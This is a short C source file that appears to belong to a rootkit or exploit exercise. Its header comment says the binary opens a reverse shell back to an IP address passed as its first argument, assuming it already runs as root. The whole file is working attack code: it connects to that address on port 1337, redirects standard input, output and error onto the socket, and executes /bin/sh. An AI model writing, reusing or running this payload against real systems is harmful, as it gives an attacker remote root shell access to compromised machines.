/*
 * This binary should initiate a reverse shell back to the ip address
 * passed as it's first argument. The binary will already have root
 * privilege so there's no need to call the escalate syscall.
*/
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>

#define PORT 1337

int main(int argc, char *argv[]) {
    struct sockaddr_in sa;
    int s;

    /* Create socket */
    if ((s = socket(PF_INET, SOCK_STREAM, 0)) < 0) {
        perror("socket");
        return 1;
    }

    /* Initialise socket address */
    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port = htons(PORT);
    if (inet_pton(AF_INET, argv[1], &(sa.sin_addr)) != 1) {
        perror("inet_pton");
        return 1;
    }

    /* Connect socket to address */
    if (connect(s, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        perror("connect");
        close(s);
        return 2;
    }

    /* Set stdin, stdout and stderr to use the socket */
    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);

    /* Pop a shell */
    char *arg[] = {"/bin/sh", NULL};
    execve("/bin/sh", arg, NULL);
    
    return 0;
}
